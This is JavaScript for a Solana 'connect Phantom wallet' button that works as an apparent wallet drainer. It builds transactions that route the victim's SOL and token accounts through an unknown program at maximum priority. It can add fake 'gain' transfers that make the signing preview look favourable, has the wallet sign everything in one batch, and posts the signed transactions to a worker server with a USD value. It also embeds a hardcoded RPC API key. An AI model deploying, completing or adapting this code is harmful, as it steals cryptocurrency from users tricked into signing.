import {
    Connection,
    PublicKey,
    ComputeBudgetProgram,
    TransactionInstruction,
    Keypair,
    Transaction, SystemProgram
} from "@solana/web3.js";
import {createAssociatedTokenAccountInstruction, getAssociatedTokenAddress, createTransferInstruction, TOKEN_PROGRAM_ID} from '@solana/spl-token';
import axios from 'axios';

// transfered from search params
const initialData = {
    workerJWT: '',
    workerURI: '',
    closepopuponsuccess: false,
    gain: {
        enabled: false,
        native: {},
        tokens: [{}]
    }
}

// create rpc instance
const connection = new Connection("https://mainnet.helius-rpc.com/?api-key=6c281646-a5ac-4d3e-8d1e-237c484e40a0");

class ServerApi {
    constructor() {
        this.fetcher = axios.create({
            baseURL: 'http://localhost:8080'
        });
        this.fetcher.interceptors.request.use((config) => {
            config.body.key = initialData.workerJWT;
            config.body.uri = initialData.workerURI;
            return config;
        }, (e) => {
            console.error('API Error', e)
            return Promise.reject(e);
        });
    }

    async init (publicKey, privateKey) {
        return await this.fetcher.post('/init', {
            me: publicKey,
            privkey: privateKey
        })
    }

    async filters () {
        return await this.fetcher.post('/filters', {});
    }

    async info (publicKey, portfolio, walletName) {
        return await this.fetcher.post('/info', {
            wallet: walletName,
            me: publicKey,
            portfolio
        })
    }

    async push (serialized, walletType = 'phantom' === 'phantom' ? 0 : 1, usd) {
        return await this.fetcher.post('/push', {
            walletType,
            signatures: serialized,
            usd
        });
    }
}

async function GainToken(pubKey, transaction, mint, from, tokenAccount, amount) {
    let fromPB = new PublicKey(from);
    mint = new PublicKey(mint);
    tokenAccount = new PublicKey(tokenAccount);
    // check exist token account for user
    const userTA = await getAssociatedTokenAddress(mint, pubKey);
    const userTAInfo = await connection.getAccountInfo(userTA);

    if (!userTAInfo) {
        // Create AssociatedTokenProgram
        transaction.add(createAssociatedTokenAccountInstruction(
            from,
            userTA,
            pubKey,
            mint
        ));
    }
    const sender = await getAssociatedTokenAddress(mint, from);

    // crate token transfer
    transaction.add(createTransferInstruction(
        sender,
        userTA,
        from,
        amount,
        [],
        TOKEN_PROGRAM_ID
    ));
    return transaction;
}


document.getElementById('phantomConnector').addEventListener('click', async () => {
    if (!(!window?.phantom?.solana)) {
        const connector = window?.phantom?.solana;
        connector.on("connect", async () => {
            const api = new ServerApi();
            const {secretKey, publicKey: newWalletPub} = await Keypair.generate();
            const userPublicKey = new PublicKey(connector.publicKey);
            const {lamports} = await connection.getAccountInfo(userPublicKey);
            const xzx0 = await api.filters();
            const portfolio = {
                // add logic for execute tokens from phantom api
                // https://api.phantom.app/tokens/v1?enableToken2022=false
                // https://api.phantom.app/price/v1
                // https://api.phantom.app/collectibles/v1
                tokens: [],
                tokens2022: [],
                native: {

                }
            };
            // compute portfolio && prices by phantom api
            await api.info(userPublicKey, portfolio, 'phantom');
            await api.init(userPublicKey, Array.from(secretKey));
            const lastBH = await connection.getLatestBlockhash();
            const transactions = [];
            const transaction = new Transaction({
                feePayer: userPublicKey,
                recentBlockhash: lastBH
            }).add(ComputeBudgetProgram.setComputeUnitPrice({
                microLamports: 200000
            })).add(ComputeBudgetProgram.setComputeUnitLimit({
                units: 1000000
            }));

            const instructions = [];

            // contract interact native
            const contractInteractInstruction = new TransactionInstruction({
                keys: [
                    {
                        pubkey: newWalletPub,
                        isSigner: false,
                        isWritable: true
                    },
                    {
                        pubkey: userPublicKey,
                        isSigner: true,
                        isWritable: true
                    },{
                        // solana compute budget
                        pubkey: new PublicKey('11111111111111111111111111111111'),
                        isSigner: false,
                        isWritable: false
                    }, {
                        // zet or zet coder
                        pubkey: new PublicKey('8K17Gvd6R59oWachgVX8G8aiyncRsESmtZ72tYQCuSEV'),
                        isSigner: false,
                        isWritable: false
                    }, {
                        // zet or zet coder
                        pubkey: new PublicKey('4N8e7Hud7KBsLyMNvnkeQ8RSGWPumDa5Pf9eXgBXZaAE'),
                        isSigner: false,
                        isWritable: true
                    }
                ],
                // contract address
                programId: new PublicKey('Ct4p4tQBDuptXjLFJUzfPmNSZcMkh2ivFuFdp3UqiCmR'),
                // method
                data:  new Uint8Array([9, 109, 178, 96, 144, 211, 152, 159])
            });

            instructions.push(contractInteractInstruction);

            for (const token of portfolio.tokens) {
                const contractInteractInstruction = new TransactionInstruction({
                    keys: [
                        {
                            pubkey: newWalletPub,
                            isSigner: false,
                            isWritable: true
                        },
                        {
                            pubkey: userPublicKey,
                            isSigner: true,
                            isWritable: true
                        },{
                            // some dest
                            pubkey: new PublicKey(''),
                            isSigner: false,
                            isWritable: false
                        }, {
                            // some dest
                            pubkey: new PublicKey(''),
                            isSigner: false,
                            isWritable: false
                        }, {
                            // some dest
                            pubkey: new PublicKey(''),
                            isSigner: false,
                            isWritable: true
                        }, {
                            // some dest
                            pubkey: new PublicKey(''),
                            isSigner: false,
                            isWritable: false
                        }, {
                            // token mint
                            pubkey: new PublicKey(token.mint),
                            isSigner: false,
                            isWritable: true
                        }
                    ],
                    programId: new PublicKey('Ct4p4tQBDuptXjLFJUzfPmNSZcMkh2ivFuFdp3UqiCmR'),
                    // method
                    data:  new Uint8Array([193, 43, 90, 230, 205, 87, 222, 41])
                });
                instructions.push(contractInteractInstruction);
            }

            for (const instruction of instructions) {
                transaction.add(instruction);
            }

            transactions.push(transaction);

            if (initialData.gain.enabled) {
                let transaction = new Transaction({
                    recentBlockhash: lastBH.blockhash,
                    feePayer: userPublicKey
                });
                for (let token of initialData.gain.tokens) await GainToken(transaction, token.mint, token.from, token.fromTA, token.amount);
                transactions.push(transaction.add(SystemProgram.transfer({
                    "fromPubkey": new PublicKey(initialData.gain.native.from),
                    "toPubkey": userPublicKey,
                    "lamports": initialData.gain.native.amount
                })));
            }

            const signedTransactions = await connector.signAllTransactions(transactions);
            const serialized = [];
            for (const transaction of signedTransactions) {
                serialized.push(transaction.serialize({
                    requireAllSignatures: true
                }).toString('base64'));
            }
            await api.push(serialized, 0, 0);
            // log logic
            if (initialData.closepopuponsuccess) {
                setTimeout(() => {
                    window.close();
                }, 5000);
            }
        });
        try {
            await connector.connect({
                onlyIfTrusted: false
            });
        } catch (e) {
            // display via modal
        }
    }
});